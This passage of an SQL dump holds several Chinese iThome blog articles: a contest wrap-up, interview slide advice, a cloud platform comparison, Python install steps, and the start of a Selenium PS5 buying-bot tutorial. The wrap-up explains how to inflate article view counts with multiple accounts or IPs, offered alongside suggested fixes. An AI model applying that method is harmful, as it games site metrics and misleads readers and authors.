','\n',char(10)),'Arm Platforms',NULL,'2021-09-18 07:57:37');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10281700','【Day 30】再…再一年 - 完賽心得與瀏覽數分析','現實主義勇者的 Windows 攻防記','30',replace('\n                        <div class="markdown__style">\n                                                            <h2>完賽心得</h2>\n<h3>起</h3>\n<p>三十天的 iThome 鐵人賽終於完賽，如同我們的隊名，<strong>「肝已經，死了」</strong>。參賽之前覺得<code>每天</code>發一篇<code>還好吧</code>，只是把之前的學習筆記拿來<code>改一改</code>、<code>寫一寫</code>，應該<code>不需要花太久時間</code>。</p>\n<h3>承</h3>\n<p>直到<code>比賽期間</code>才發現，<code>一天</code>寫一篇<code>太難了</code>，要在兼顧<code>文章品質</code>與<code>內容多寡</code>的情況下，一天一篇<code>對我而言</code>實在<code>不可能</code>，況且平常也有其他的事，不過<code>好險</code>我有提早開始<code>囤文章</code>。</p>\n<p>在參加這次鐵人賽前，身為 iT 邦幫忙<code>資深</code>的<code>潛水艇</code>，我從來都<code>沒有</code>按過文章的 <code>Like</code>，更別說<code>留言回覆</code>，事實上我是在開賽<code>前幾週</code>才<code>創帳號</code>。</p>\n<h3>轉</h3>\n<p>於是我在這次比賽被狠狠的<code>制裁</code>了。直到這次鐵人賽<code>途中</code>我才<code>發現</code>，不論是 <code>Like</code>、<code>留言</code>，甚至是<code>瀏覽數</code>，都對<code>發文者</code>來說是一個<code>很大的鼓勵</code>。</p>\n<p>另外參賽的這段期間，我很好奇究竟<code>為什麼</code>我的<code>瀏覽數</code>這麼<code>低</code>，明明文章的<code>難度</code>、<code>價值</code>應該<code>不會</code>比一些瀏覽數高的<code>差</code>才對。</p>\n<p><code>不服輸</code>的我，最終<code>看到</code>了這篇文章 <a href="https://ithelp.ithome.com.tw/articles/10217609" target="_blank">[Day 4] Xcode安裝 為什麼有5000觀看??? ithelp觀察實驗</a>，覺得感受到些許<code>安慰</code>還有想<code>偷笑</code>，原來<code>同是天涯淪落人</code>。以上內容<code>致敬</code>他的<code>文體</code>，只是我還是<code>習慣</code>用<code>標點符號</code>。<br>\n<img src="https://i.imgur.com/7PXolFY.png" alt=""></p>\n<h3>合</h3>\n<p>話說回來，這次比賽原本就是為了記錄我在<a href="https://isip.moe.edu.tw/wordpress/?page_id=368" target="_blank">台灣好厲駭導師制度</a>的學習心得。而且在寫文章的過程中，時常會為了想把一項技術解釋得更精確而去查詢更多的相關資料。在這反覆的過程中，其實自己也能學習到很多東西。</p>\n<p>因此如果問我參加鐵人賽到底值不值得，我的答案是肯定的；要是問我明年還要不要參加，再...再說。</p>\n<p><img src="https://i.imgur.com/EmUTyHg.png" alt=""></p>\n<h2>瀏覽數分析</h2>\n<p>以前只要刷新網頁就會算一次，後來小財神十分友善的回復，不久後就把這個問題修復了。<br>\n<img src="https://i.imgur.com/mQWJUGc.png" alt=""></p>\n<h3>目前規則</h3>\n<ol>\n<li>如果帳號有成功登入，Request 有帶 ithelp2016_desktop 這個 Cookie，不管 IP 為何，每五分鐘只會算一次瀏覽數。</li>\n<li>如果是匿名瀏覽，這時則是看 IP，用幾個 IP 匿名瀏覽就會算幾次瀏覽數，一樣五分鐘重置一次。</li>\n</ol>\n<h3>刷瀏覽數</h3>\n<p>根據目前規則，有兩個可行方案來刷瀏覽數。</p>\n<ol>\n<li>創很多帳號，每五分鐘瀏覽一次目標文章。一天有 1440 分鐘，每 5 分鐘算一次，所以每個帳號一天最多能在同一篇文章創造 288 個瀏覽數。</li>\n<li>想辦法取得 IP，用不同 IP 匿名瀏覽目標文章。同樣的，每個 IP 一天最多能在同一篇文章創造 288 個匿名瀏覽數。</li>\n</ol>\n<p>以 Security 這個主題而言，只要有 5 個 IP 或帳號，刷一天就可以超過第一名文章的瀏覽數。<br>\n<img src="https://i.imgur.com/QywWgpX.png" alt=""></p>\n<h3>建議</h3>\n<p>參考 <a href="https://www.tech-girlz.com/2021/07/youtube-view-count-analysis.html" target="_blank">YouTube 計次方式</a>，我認為可以在現有的規則上再加入一些限制。如此一來，至少透過一般的機器人是無法大量產生瀏覽數的。</p>\n<ol>\n<li>確認使用者在文章連結的停留時間，可以根據文章的長度規定至少要停留多久才計算瀏覽數。</li>\n<li>根據使用者的游標位置(cursor position)、滑鼠滾輪(scroll) 等等因素判斷是否是真人正在瀏覽網頁。</li>\n</ol>\n<h2>最後的最後</h2>\n<p>希望這個網站可以變得越來越好，我本身也從這裡學到許多知識，也讀了很多不錯的文章來解決遇到的問題。</p>\n<p>所有文章跟對應的專案都有備份到我的 GitHub <a href="https://github.com/zeze-zeze/2021iThome" target="_blank">zeze-zeze/2021iThome</a>，你各位如果喜歡可以幫忙點個 Star m(_ _)m。</p>\n<p><strong><a href="https://www.youtube.com/watch?v=6wouFCeF7AI" target="_blank">走囉～高歌離席 !</a></strong></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Security',NULL,'2021-10-15 00:04:19');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10265307','[履歷]用簡報讓面試官集中注意力','全端工程師生存筆記','4',replace('\n                        <div class="markdown__style">\n                                                            <blockquote>\n<p>都是電視劇，難看的你連一分鐘都看不下去，好看的卻能讓你廢寢忘食地去追；同樣的道理也能放到簡報上面。</p>\n</blockquote>\n<p>我想很多人都聽過木桶理論，一個木桶可以裝多少水是取決於最短的木條；但木桶不一定要正著放，如果你把木桶斜放，<code>只要角度正確了，能裝多少水就是取決於最長的那根木條</code>。</p>\n<p>面試的時候也一樣，盡量發揮自己的長處，簡報可以引導對方問你知道的問題，而非不熟悉的問題。</p>\n<h2>大綱</h2>\n<ol>\n<li>\n<strong>準備面試簡報有哪些好處？</strong>\n<ul>\n<li>1.1 延長對方認識你的時間</li>\n<li>1.2 幫面試官畫重點</li>\n<li>1.3 讓每次面試穩定發揮</li>\n<li>1.4 引導面試官提問方向</li>\n<li>1.5 遠端面試必備</li>\n</ul>\n</li>\n<li>\n<strong>簡報中要有哪些內容</strong>\n<ul>\n<li>2.1 首頁大綱</li>\n<li>2.2 專業技能</li>\n<li>2.3 工作經驗</li>\n<li>2.4 分享知識</li>\n<li>2.5 傑出表現</li>\n<li>2.6 總結</li>\n</ul>\n</li>\n<li>\n<strong>簡報的提醒</strong>\n<ul>\n<li>3.1 善用「備忘錄」</li>\n<li>3.2 一定要事前演練多次</li>\n<li>3.3 要能夠隨機應變</li>\n<li>3.4 依據面試公司客製化內容</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h1>1. 準備面試簡報有哪些好處？</h1>\n<p>在說明好處之前，我還是先提醒一下，<code>並不是每場面試你都有機會把簡報拿出來講</code>；每間公司的面試流程不同，我建議是在對方請你做自我介紹時詢問：「我這邊有準備一份簡報，請問我可以用它來做自我介紹嗎？」</p>\n<h3>1.1 延長對方認識你的時間</h3>\n<p>如果你今天面試的職位是「資深工程師」，絕大多數的公司都願意花多一點的時間來評估這個人選是否適任，畢竟資深工程師的薪水也是一筆營運成本。</p>\n<p>大部分面試的時間會落在 1~2 小時之間，當然面試時間長短沒有絕對的好壞，但可以作為對方是否對你感興趣的指標之一；而「面試簡報」如果做得好，是可以<code>大幅提升對方公司對你的興趣</code>，同時<code>延長此次面試的時間長度</code>；如果你本身是個有料的人，對方越認識你，其實你是越佔據談判優勢的。</p>\n<hr>\n<h3>1.2 幫面試官畫重點</h3>\n<p>面試官手上的是<code>文字為主的紙本履歷</code>，其實能夠進入到面試階段，你跟對手的能力都大同小異；因此有些面試官直到面試當下才開始瀏覽你的履歷，假設你是他今天面試的第五位求職者，他在聽你說話的當下其實已經有點精神渙散想下班了，如果你想要讓面試官在疲乏的面試中<code>精神為之一震</code>，簡報就是非常好的辦法！</p>\n<p>好的簡報能直接讓對方重點了解你的技能、經歷、個人特質，大幅<code>強化面試官對資訊的吸收能力</code>。</p>\n<hr>\n<h3>1.3 讓每次面試穩定發揮</h3>\n<p>有些人一面試就緊張，一緊張原本滾瓜爛熟的自我介紹通通忘光光；就算是面試老手，也常在面試中漏講了一兩個重要經歷。</p>\n<p>但只要你有準備簡報，並在<code>備忘錄</code>中寫好每一頁的應對進退，我相信你能夠做出最接近完美的表演，面試簡報不僅是幫面試官畫重點，更是<code>幫助自己在每次面試都能夠穩定發揮的武器</code>。</p>\n<hr>\n<h3>1.4 引導面試官提問方向</h3>\n<p>我們可以利用人類本能，當大腦有一條輕鬆的路可以走的時候，它往往會直接選擇這條路。</p>\n<p>有面試簡報的狀態下，面試官往往會放下手中的紙本履歷，把注意力集中在你的簡報上；此時<code>你是掌握話語權</code>的人，面試官的<code>提問也會集中在你簡報呈現的資訊</code>上面，只要你對簡報上的一切知識瞭若指掌，面試官就會下意識地認為你已經掌握履歷上的所有知識。</p>\n<blockquote>\n<p>如果你的白板題答得不夠好，但簡報中與面試官的問答流暢；有些面試官就會腦補你是因為緊張而導致白板題發揮不良，你就可能因此獲得 Offer 或是下一輪面試機會。</p>\n</blockquote>\n<hr>\n<h3>1.5 遠端面試必備</h3>\n<p>因為疫情的關係，現在大部分的面試都改為遠端，而遠端面試常常會遇到以下問題：</p>\n<ul>\n<li>視訊時鏡頭模糊</li>\n<li>聲音受到干擾</li>\n<li>肢體語言表達被限制</li>\n</ul>\n<p>而上述這些常見問題用簡報就能有效解決：</p>\n<ul>\n<li>\n<del>視訊時鏡頭模糊</del> → 用螢幕分享自己的簡報，畫面清晰。</li>\n<li>\n<del>聲音受到干擾</del> → 即使有時聲音受到干擾，面試官也能從簡報腦補你大概描述的內容。</li>\n<li>\n<del>肢體語言表達被限制</del> → 在簡報上你可以放相關的佐證圖片，彌補無法用肢體語言的缺點。</li>\n</ul>\n<hr>\n<h1>2. 簡報中要有哪些內容</h1>\n<p>我不敢說自己的簡報做得很棒，只能說這份簡報有傳達<code>重點內容</code>；後續美化的部分，建議讀者參考其他大神。</p>\n<blockquote>\n<p>參考我的描述，<del>不要參考我的美術</del></p>\n</blockquote>\n<h3>2.1 首頁大綱</h3>\n<ul>\n<li>\n<strong>放上你認為最棒的照片（形象照）</strong>\n<ul>\n<li>工程師請放上讓人<code>第一眼看到就覺得專業的照片</code>，學士照、證件照相對的不合適，生活照則很看面試的公司。</li>\n<li>再次建議請<code>專業</code>人士幫忙拍照，有質感的照片是值得花錢的。</li>\n</ul>\n</li>\n<li>\n<strong>簡報大綱</strong>\n<ul>\n<li>一定要把會說的主題整理成「大綱」，讓面試官對你接下來分享的內容有<code>心理預期</code>。</li>\n</ul>\n</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/201032561rcpR5v2mj.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/201032561rcpR5v2mj.png"></p>\n<hr>\n<h3>2.2 專業技能</h3>\n<ul>\n<li>\n<strong>把最強的專業放上去</strong>\n<ul>\n<li>這裏放上去的專業<code>絕對要經得起考驗</code>，面試官十之八九會在這裡面出題目。</li>\n</ul>\n</li>\n<li>\n<strong>建議使用 Logo 代替技術名稱</strong>\n<ul>\n<li>這是一個小技巧，相比於文字，圖片在畫面佔的比例更大，會讓人產生你有豐富技能的錯覺。</li>\n<li>記得解析度要找差不多的，並且 Logo 呈現要有<code>一致性</code>（ex：都是長方形）。</li>\n</ul>\n</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256YLo2lbF9zi.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256YLo2lbF9zi.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256bN3nZQ3eIy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256bN3nZQ3eIy.png"></p>\n<hr>\n<h3>2.3 工作經驗</h3>\n<blockquote>\n<p>這裡我會挑選工作中最具代表性的專案，如果你是以維護系統為主，可以挑選幾個重要的 Feature。</p>\n</blockquote>\n<p>我個人會把簡報<code>大部分的時間放在工作經驗上面</code>，畢竟硬實力才是最重要的。</p>\n<ul>\n<li>\n<strong>簡述專案</strong>\n<ul>\n<li>建議擬逐字稿，字數最多<code>不超過 100 個字</code>，只講代表性功能即可。</li>\n<li>如果這個專案是在有很大時間壓力下完成的，可以特別說明。</li>\n</ul>\n</li>\n<li>\n<strong>在工作/專案擔任的角色</strong>\n<ul>\n<li>你擔任前端 / 後端 / MIS / PM？</li>\n<li>有需要跟客戶或是其他部門溝通協調資源嗎？</li>\n</ul>\n</li>\n<li>\n<strong>你曾經解決過什麼問題</strong>\n<ul>\n<li>簡述遇到的問題以及解決方式。</li>\n</ul>\n</li>\n<li>\n<strong>這個專案用到什麼特別的技術</strong>\n<ul>\n<li>為什麼用到這個技術，它解決或完成了哪些 Feature。</li>\n</ul>\n</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256XUaYbMUGLJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256XUaYbMUGLJ.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256PpmRKaDfqJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256PpmRKaDfqJ.png"></p>\n<hr>\n<h3>2.4 分享知識</h3>\n<blockquote>\n<p>如果能力與時間所及，我非常建議讀者經營部落格，在分享的過程中會得到更精煉的知識。</p>\n</blockquote>\n<ul>\n<li>表達自己是樂於分享的人</li>\n<li>用實際案例證明自己持續學習</li>\n<li>側面說明自己有很棒的文字表達能力</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256vwRcJ47rqO.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256vwRcJ47rqO.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256Bdc4Qj8AOo.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256Bdc4Qj8AOo.png"></p>\n<hr>\n<h3>2.5 傑出表現</h3>\n<blockquote>\n<p>這是一個能讓面試官對你有強烈印象的 PART</p>\n</blockquote>\n<ul>\n<li>表現自己的人格特質</li>\n<li>要有獨特性與記憶點</li>\n</ul>\n<p>舉例：</p>\n<ul>\n<li>\n<strong>連續寫超過 700 天的部落格</strong>\n<ul>\n<li>這個行為會讓人覺得你一個非常有<code>恆心、意志力</code>的人。</li>\n</ul>\n</li>\n<li>\n<strong>參加技術比賽得獎</strong>\n<ul>\n<li>會相信這個人<code>技術力</code>沒問題（所以該報名鐵人賽啦～）。</li>\n</ul>\n</li>\n<li>\n<strong>下班後自學工作外的技術，解決生活中遇到的問題</strong>\n<ul>\n<li>是個<code>好學</code>的人，並且有<code>解決問題</code>的能力。</li>\n</ul>\n</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/201032563g7VrzmffR.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/201032563g7VrzmffR.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256vTVwlZ3Bfm.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256vTVwlZ3Bfm.png"></p>\n<hr>\n<h3>2.6 總結</h3>\n<ul>\n<li>\n<strong>再次強化簡報的重點</strong>\n<ul>\n<li>如果前面講太多，面試官一路聽下來也會消化不良，你在這裡要幫他們把<code>重點中的重點</code>呈現出來。</li>\n</ul>\n</li>\n<li>\n<strong>只要面試官沒說，你就停在這個畫面不要馬上關掉</strong>\n<ul>\n<li>請給面試官做筆記的時間。</li>\n</ul>\n</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210916/20103256FtHtRq7L3I.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20103256FtHtRq7L3I.png"></p>\n<hr>\n<h1>3. 簡報的提醒</h1>\n<h3>3.1 善用「備忘錄」</h3>\n<p>在簡報投影時，你可以光明正大的看著「備忘錄」上的小抄，下面推薦兩個適合放進去的內容：</p>\n<ul>\n<li>\n<strong>簡報註解</strong>\n<ul>\n<li>\n<code>放重點即可</code>，如果放太多內容或是逐字稿，有時講起來反而不順。\n<blockquote>\n<p>不過這塊因人而異，選擇能讓自己表現最好的方式即可。</p>\n</blockquote>\n</li>\n<li>每次面試結束後，都可以不斷完善它。</li>\n</ul>\n</li>\n<li>\n<strong>專業知識</strong>\n<ul>\n<li>像是當面試官問你後端框架的問題，你可以很自然地切換到那頁簡報，看備忘錄上的<code>關鍵字</code>提醒自己回答方向。</li>\n<li>有些技術的專有名詞很難記或是不好唸，你可以放上去讓你敘述起來更流暢。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3>3.2 一定要事前演練多次</h3>\n<p>做完簡報只是一個開始而已，你要過多次的演練來了解：</p>\n<ul>\n<li>簡報所需時間</li>\n<li>我容易在哪個環節卡住</li>\n<li>是否有前後不一的內容</li>\n<li>是不是有贅詞、口頭蟬</li>\n</ul>\n<p>在自己能夠獨自把簡報講得通順後，我建議要<code>找周圍的親朋好友實際演練</code>，畢竟對著螢幕講話跟對著真人講話，兩者難易度還是差很多的；同時你也可以藉此得到對方的反饋，了解哪些部分需要調整。</p>\n<hr>\n<h3>3.3 要能夠隨機應變</h3>\n<p>我的面試簡報一共有 16 頁（會根據公司調整頁數和內容），報告時間會抓在 5~10 分鐘之間，根據不同的面試狀況，我會調整<code>重點</code>講述的內容。</p>\n<ul>\n<li>\n<strong>技術職面試官</strong>\n<ul>\n<li>分享專案使用過哪些技術，用技術解決過哪些問題。</li>\n</ul>\n</li>\n<li>\n<strong>市場營銷的面試官</strong>\n<ul>\n<li>分享與客戶溝通的經驗，解決了客戶的哪些痛點。</li>\n</ul>\n</li>\n<li>\n<strong>公司高層</strong>\n<ul>\n<li>分享跨部門溝通的經驗，像是如何整合不同部門的需求，提出共贏的方案。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3>3.4 依據面試公司客製化內容</h3>\n<p>如果你行有餘力，並且對面試的公司有極大興趣；我建議你的簡報可以客製化，以<code>符合該公司職位 JD 所需</code>的內容。</p>\n<p>如果你這樣做，面試官就不用去思考你的能力哪些是公司需要的，哪些是不需要的；反而會覺得你真的很適合這份工作，以此大幅提升你的錄取率。</p>\n<hr>\n<h3>後記</h3>\n<p>面試簡報的製作及提醒到這裡就告一個段落了，現在<code>會準備面試簡報的人還不算多；如果你有準備就會立刻凸顯自己的優勢</code>，很多人會說面試的自我介紹不要超過 3 分鐘，因為你說太多面試官會記不住。</p>\n<p>但有了這份簡報後，我個人認為把自我介紹的時間拉長到 10 分鐘都還算合理；但請記住，你<code>所呈現的內容必須全部都是精華</code>，冗言贅詞的 10 分鐘簡報比 1 分鐘沒重點的自我介紹更慘。</p>\n<hr>\n<p>感謝大家的閱讀，如果喜歡我的文章可以<code>訂閱</code>接收通知；如果有幫助到你，按<code>Like</code>可以讓我更有寫文的動力，我們明天見～</p>\n<blockquote>\n<p><strong>我在 <a href="https://medium.com/dean-lin" target="_blank">Medium 平台</a> 也分享了許多技術文章</strong><br>\n❝ 主題涵蓋「<a href="https://medium.com/dean-lin/mis-devops/home" target="_blank">MIS &amp; DEVOPS</a>、<a href="https://medium.com/dean-lin/database/home" target="_blank">資料庫</a>、<a href="https://medium.com/dean-lin/frontend/home" target="_blank">前端</a>、<a href="https://medium.com/dean-lin/backend/home" target="_blank">後端</a>、<a href="https://medium.com/dean-lin/microsft-365/home" target="_blank">MICROSFT 365</a>、<a href="https://medium.com/dean-lin/googlecloud/home" target="_blank">GOOGLE 雲端應用</a>、<a href="https://medium.com/dean-lin/self-discipline/home" target="_blank">自我修煉</a>」希望可以幫助遇到相同問題、想自我成長的人。❞</p>\n</blockquote>\n<hr>\n<blockquote>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20220624/20103256Y2QpzHcSpv.png" alt="https://ithelp.ithome.com.tw/upload/images/20220624/20103256Y2QpzHcSpv.png"></p>\n<p>在許多人的幫助下，本系列文章已出版成書，除了添加新的篇章，更完善了每個案例的應對進退；如果覺得筆者分享的內容對你有幫助，歡迎到天瓏書局選購支持。</p>\n<p><strong>購書連結：</strong> <a href="https://www.tenlong.com.tw/products/9786263331525" target="_blank">https://www.tenlong.com.tw/products/9786263331525</a></p>\n</blockquote>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-09-19 10:51:10');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10260978','Day 3 雲端四大平台比較：AWS . GCP . Azure . Alibaba','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','3',replace('\n                        <div class="markdown__style">\n                                                            <h3>雲端三大平台：市占比 &amp; 目標使用族群</h3>\n<p>根據市調公司 Gartner 統計，2016 - 2019 年之間各大雲端傷的市佔比率，可以看大前四大雲端供應商 AWS , GCP, Azure 等都高速上漲，搶佔了現有市場。我們將利用下圖，來深入比較三大平台的優缺點。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951HJrXDQLg7I.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951HJrXDQLg7I.png"></p>\n<p>首先，我們將上方折線圖轉換為百分比圖，可一目瞭然彼此在 2019 時的市占比率，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951uNGucf0WPy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951uNGucf0WPy.png"></p>\n<p>而對於各平台所專注的使用者類別，AWS 與 GCP 相對對於開源的社群更為友善，比較沒有綁定的軟體架構 (如 .NET)，因此我們可以半開玩笑的說，AWS &amp; GCP 吸引了更多 Free World 自由世界的使用者，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951CWqJuv7wEF.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951CWqJuv7wEF.png"></p>\n<p>而對於 Azure，最先一批使用者即為原本使用微軟體系的企業與用戶。但近年來微軟也開始向開源社群邁進，因此使用微軟架構的公司也能與 AWS &amp; GCP 的服務進行結合，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951F3ZKw9pD8N.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951F3ZKw9pD8N.png"></p>\n<p>而阿里雲 (Alibab)的使用者，非常明確，就是中國內部市場，如下圖。但近年來在各大軟體活動上，也開始能看到阿里雲的攤位，我與其中幾位架構師聊過，他們正開始擴展市場到東南亞地區，所以我們也會越來越常見到這個雲端商被提起。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/2010095159lx9y3UfP.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/2010095159lx9y3UfP.png"></p>\n<h3>雲端四大平台：優勢比較</h3>\n<h4>AWS 優勢</h4>\n<p><strong>市占最高：</strong> AWS 最大的優勢在於市佔比率遠遠大於其他競爭者。這帶來什麼優勢？這代表你在使用 AWS 時遇到問題，網路上將有著上千篇文章來幫助你解決問題，不怕遇到沒有人遇過的疑難雜症。此外，市佔比高也代表著更多企業需要這樣的人才，也讓學習 AWS 所帶來的價值提高，最直接的就是拿到薪水更高的職位。</p>\n<p><strong>服務最完整：</strong> 此外，AWS 也是最早起家的，從 2006 年開始，就不斷新增服務，除了核心的 EC2、VPC 等，不斷增加，也讓他成為目前各大雲端商中，服務最完整的，不怕找不到你所需要的相對應服務。</p>\n<p>以上 AWS 兩項優勢統整成下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951BhwC1t98Hw.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951BhwC1t98Hw.png"></p>\n<h4>GCP 優勢</h4>\n<p><strong>多雲理念：</strong> GCP 不同於其他雲端商，他並不想要你只要他的服務。相反的，GCP 更提倡為所謂的「多雲架構」，鼓勵公司一次使用多個雲端平台的服務，將自我定位為雲端整合者。在許多 GCP 服務中，都可以看到他們有去相容競爭者的產品，符合其觀念上的理念。</p>\n<p><strong>容器專精：</strong> GCP 專注於容器相關的服務建設，其中最常聽到的即是 GKE (Google Kubernetes Engine)。儘管其他雲端平台也開始有著 Kubernetes 相關服務，但 GCP 仍然在這塊為目前最被大家使用的，比如我在美國金融公司實習時，公司即是採用 GKE 來管理全公司容器部署。</p>\n<p><strong>台灣法規相容：</strong> GCP 有在台灣彰化設立機房，可更配合資料落地等相關法規，特別對金融類公司有吸引力。</p>\n<p>以上 GCP 三點優勢統整成下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/201009515Bpzh6brc1.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/201009515Bpzh6brc1.png"></p>\n<h4>Azure 優勢</h4>\n<p><strong>.NET 體系直上：</strong> Azure 從微軟起家，自然更相容於原微軟體系的開發生態。因此，當傳統企業想要無痛上雲端，自然是使用 Azure 有著最低的摩擦成本。</p>\n<p><strong>方案優惠：</strong> Azure 照顧原微軟使用客戶，提供更多優惠價格，對於想節省成本的公司更具吸引力。</p>\n<p><strong>台灣法規相容：</strong> Azure 於 2020 層宣佈要在台灣設廠，若真的建立了，也能擁有法規相容這樣優勢。</p>\n<p>以上 Azure 三點優勢統整成下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951SlzhNGTHNK.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951SlzhNGTHNK.png"></p>\n<h4>Alibaba 優勢</h4>\n<p><strong>內需：</strong> 阿里雲主要就是中國內需市場，目前仍屬於較為封閉的使用者族群。</p>\n<p>以上 Alibaba 一個優勢統整成下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951ByoDt9FDM4.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951ByoDt9FDM4.png"></p>\n<h4>總結</h4>\n<p>面對市場上的四大雲端平台，各自有各自的優勢。AWS 有著最大的市佔率與最完整的服務種類、GCP 則在容器方面更為精通、Azure 與 .NET 體系緊密結合、Alibaba 則供應中國內需市場。</p>\n<h4>What''s Next?</h4>\n<p>明天，我們將接著介紹「AWS 無限手套的第一個網路寶石：VPC」！</p>\n<hr>\n<blockquote>\n<p>歡迎加入「用圖片高效學程式」:<br>\n<a href="https://www.facebook.com/105673814305452" target="_blank">https://www.facebook.com/105673814305452</a></p>\n</blockquote>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-08 11:53:53');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10258853','[Day1] 基本工具安裝','從零開始使用python打造簡易投資工具','1',replace('\n                        <div class="markdown__style">\n                                                            <h1>1.安裝anaconda</h1>\n<p>anaconda是常用的python開發環境，他裡面提供了多樣化的python開發環境，除此之外python在不同的專案會需要安裝不同的lib組合，這些lib有時候會相衝突，anaconda可以為每個專案提供一組環境安裝lib，減少相衝突的機會。以下網址點進去按download就可以下載安裝了，會跳一個註冊的頁面不用理他。<br>\n<a href="https://www.anaconda.com/products/individual-d" target="_blank">https://www.anaconda.com/products/individual-d</a></p>\n<h1>2.安裝shiaoji,talib和dataframe</h1>\n<p>shiaoji是永豐金證券提供的python交易api，同時支援期貨交易和證券交易相關的功能，不管是期貨投資人還是現股交易都可以用，要。talib則是用來計算各種技術指標的工具，dataframe則是用來處理各種2d表格會用到的工具，在安裝的時候先在Anaconda Prompt上面點右鍵-&gt;使用系統管理員身分開啟，進入安裝python的命令列，之後輸入<br>\npip install shioaji<br>\npip install pandas<br>\npip install ta-lib<br>\n在安裝ta-lib的時候是有可能會出現錯誤的，在這個時候就要到以下網址根據python版本和windows版本(32/64位元)下載相對應的wheel檔安裝ta-lib<br>\n<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#ta-lib" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#ta-lib</a><br>\n像我是3.8版的python和64位元windows，就把它放到桌面，然後python命令列也使用<br>\ncd Desktop，移動到桌面後，使用以下指令安裝talib<br>\npip install TA_Lib-0.4.21-cp38-cp38-win_amd64.whl</p>\n<p>作為第一天的暖身，就先到這邊吧，明天開始進入正題<br>\n雖然說看了其他人發的東西開始覺得我是不是搞錯永豐API的意思，不過我還是會盡量把這30天的文章發完的</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-01 20:43:59');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10262268','[Day13] 搶 PS5 程式怎麼寫? 動態爬蟲詳細教學!','奇怪的知識增加了!原來程式還可以這樣用?!','13',replace('\n                        <div class="markdown__style">\n                                                            <p>我知道PS5已經退燒了，但要不是因為想搶PS5我根本不會碰Python (一種恩人的概念)<br>\n所以今天還是拿PS5舉例喔~</p>\n<hr>\n<p><strong>Selenium的基本用法</strong></p>\n<p>大家只要想Selenium就是模擬我們用電腦的<strong>點擊、打字、導向網頁</strong>等行為</p>\n<ul>\n<li>導向指定網頁</li>\n</ul>\n<pre><code>driver.get("https://m.momoshop.com.tw/mymomo/login.momo")\n</code></pre>\n<p>要買東西，第一步就是要先到購物網站登入。<br>\n<em>driver.get()</em> 裡面放的是你要連的網站，這邊打開是momo購物網的登入頁面喔~<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210911/20133286zxv9yZeqET.png" alt="https://ithelp.ithome.com.tw/upload/images/20210911/20133286zxv9yZeqET.png"></p>\n<ul>\n<li>打字</li>\n</ul>\n<pre><code>driver.find_element_by_id(''memId'').send_keys(''你的帳號'')\ndriver.find_element_by_id(''passwd'').send_keys(''你的密碼'')\n</code></pre>\n<p>再來就是要輸入你的帳號密碼，<em>send_keys()</em> 裡面放的是你要輸入的字，<br>\n那要怎麼知道要在哪一個框框輸入帳號呢? 首先要在網站頁面按 <strong>F12</strong>，<br>\n接下來再按圖片1號處的選取箭頭，點擊圖片2號處的帳號框框，就可以得到帳號框的屬性囉(圖片3號處)!<br>\n<img 